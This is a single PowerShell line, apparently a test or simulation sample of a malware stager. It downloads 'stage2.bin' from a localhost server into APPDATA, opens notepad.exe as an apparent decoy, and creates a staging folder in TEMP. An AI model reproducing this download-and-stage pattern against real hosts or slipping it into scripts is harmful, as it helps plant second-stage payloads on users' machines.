
$DownloadUrl = 'http://localhost:9001/stage2.bin'; $LocalPath = "$env:APPDATA\stage2.bin"; Invoke-WebRequest -Uri $DownloadUrl -OutFile $LocalPath -UseBasicParsing; & "notepad.exe"; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
